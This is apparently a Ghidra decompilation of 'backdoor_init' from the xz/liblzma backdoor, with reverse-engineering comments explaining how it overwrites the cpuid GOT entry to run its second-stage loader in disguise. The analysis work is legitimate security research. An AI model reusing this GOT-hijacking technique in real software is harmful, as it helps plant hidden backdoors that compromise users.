// /home/kali/xzre-ghidra/xzregh/10A794_backdoor_init.c
// Function: backdoor_init @ 0x10A794
// Calling convention: __stdcall
// Prototype: void * __stdcall backdoor_init(elf_entry_ctx_t * state, u64 * caller_frame)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief calls @ref backdoor_init_stage2 by disguising it as a call to cpuid.
 *
 *   @ref backdoor_init_stage2 is called by replacing the _cpuid() GOT entry to point to @ref backdoor_init_stage2
 *
 *   stores elf_entry_ctx_t::symbol_ptr - elf_entry_ctx_t::got_offset in elf_entry_ctx_t::got_ptr which is the GOT address .
 *
 *   @param state the entry context, filled by @ref backdoor_entry
 *   @param caller_frame the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver
 *   @return void* the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of backdoor_init_stage2()
 */

void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)

{
  long lVar1;
  undefined *puVar2;
  void *pvVar3;
  long *plVar4;
  
  (state->got_ctx).got_offset = (ptrdiff_t)state;
  init_elf_entry_ctx(state);
  puVar2 = PTR__Llzma_block_buffer_decode_0_0010e000;
  state->frame_address = (u64 *)(state->got_ctx).return_address;
  pvVar3 = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
  (state->got_ctx).got_ptr = pvVar3;
  plVar4 = (long *)((long)pvVar3 + *(long *)(puVar2 + 8));
  (state->got_ctx).return_address = plVar4;
  if (plVar4 != (long *)0x0) {
    lVar1 = *plVar4;
    *plVar4 = (long)pvVar3 + *(long *)(puVar2 + 0x10);
    pvVar3 = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
    *plVar4 = lVar1;
  }
  return pvVar3;
}

